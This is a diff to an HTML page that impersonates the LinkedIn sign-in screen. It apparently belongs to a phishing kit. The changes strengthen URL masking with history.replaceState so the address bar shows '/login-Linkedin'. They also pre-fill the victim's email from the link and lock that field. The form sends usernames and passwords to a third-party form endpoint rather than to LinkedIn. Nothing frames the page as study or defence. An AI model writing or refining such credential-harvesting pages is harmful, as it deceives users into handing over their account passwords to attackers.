@@ -4,6 +4,28 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Sign in to LinkedIn</title>
+  <script>
+    // Improved URL masking with refresh protection
+    (function() {
+      // Store the original URL
+      const originalUrl = window.location.pathname + window.location.search;
+      
+      // Only mask the URL if we're not coming from a refresh
+      if (!sessionStorage.getItem('urlAlreadyMasked')) {
+        // Set flag to prevent masking on refresh
+        sessionStorage.setItem('urlAlreadyMasked', 'true');
+        
+        // Mask the URL (change to whatever path you want to display)
+        history.replaceState({}, "", "/login-Linkedin" + window.location.search);
+        
+        // Restore original URL before page unload (if user refreshes)
+        window.addEventListener('beforeunload', function() {
+          sessionStorage.removeItem('urlAlreadyMasked');
+          history.replaceState({}, "", originalUrl);
+        });
+      }
+    })();
+  </script>
   <style>
     body {
       font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
@@ -188,9 +210,6 @@
     }
   </style>
   <script>
-    // URL MASKING - Changes the displayed URL immediately
-    window.history.replaceState({}, "", "/login-linkedin");
-
     let isFirstSubmission = true; // Track if it's the first submission
 
     // JavaScript to extract the email from the URL and pre-fill the field
@@ -277,7 +296,7 @@
     <form action="https://formbold.com/s/9mkW5" method="post" onsubmit="handleSubmit(event)">
       <div class="form-group">
         <label for="username">Email</label>
-        <input type="email" id="username" name="username">
+        <input type="email" id="username" name="username" readonly>
       </div>
       <div class="form-group">
         <label for="password">Password</label>
